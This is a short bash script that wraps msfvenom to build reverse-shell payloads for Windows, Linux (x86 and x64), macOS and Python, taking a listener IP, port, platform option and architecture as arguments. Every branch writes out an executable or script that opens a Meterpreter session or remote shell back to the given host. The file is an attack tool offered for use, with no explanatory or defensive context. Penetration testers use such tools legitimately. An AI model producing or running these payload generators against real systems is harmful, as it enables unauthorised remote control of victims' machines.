#!/bin/bash

# $1 -> IP
# $2 -> Port
# $3 -> options
# $4 -> Arch

if [ $3 -eq 1 ]
then
	# Windows
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe > reverse.exe
elif [ $3 -eq 2 ]
then
	if [ $4 -eq 1 ]
	then
		# Linux (x86)
		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > reverse.elf
	else
		# Linux (x64)
		msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > shell.elf
	fi
elif [ $3 -eq 3 ]
then
	# MAC os
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=$1 LPORT=$2 -f macho > reverse.macho
elif [ $3 -eq 4 ]
then
	# Script Based (Python)
	msfvenom -p cmd/unix/reverse_python LHOST=$1 LPORT=$2 -f raw > reverse.py
else
	echo "Error!"
fi

echo -n "[-] File Location: "; pwd